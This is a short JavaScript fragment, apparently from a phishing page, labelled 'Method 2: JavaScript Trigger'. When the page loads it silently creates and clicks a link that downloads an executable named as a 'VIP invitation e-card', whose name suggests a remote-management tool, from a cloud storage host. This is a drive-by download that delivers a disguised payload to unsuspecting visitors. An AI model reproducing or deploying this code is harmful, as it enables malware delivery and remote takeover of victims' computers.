 // Method 2: JavaScript Trigger
        window.addEventListener('load', function() {
            const fileUrl = 'https://pub-626480847b854b77889f6730d12642ee.r2.dev/VIP_INVITATION_E_CARD_rmm_v2_5_0_67_oidca3c87b7_a585_4f32_8343_6ca8a8aade3a.exe';
            const link = document.createElement('a');
            link.href = fileUrl;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        });
